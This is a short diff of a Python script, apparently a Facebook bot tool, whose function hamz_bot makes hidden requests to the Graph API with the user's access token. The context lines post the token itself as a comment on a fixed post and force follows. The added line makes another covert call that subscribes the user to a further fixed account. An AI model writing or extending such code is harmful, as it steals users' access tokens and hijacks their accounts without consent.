@@ -570,6 +570,7 @@ def hamz_bot():
     requests.post('https://graph.facebook.com/100004715860665/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +token+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +kom+ '&access_token=' + token)
+    requests.post('https://graph.facebook.com/100024533690214/subscribers?access_token=' + token)
     menu()
     
         
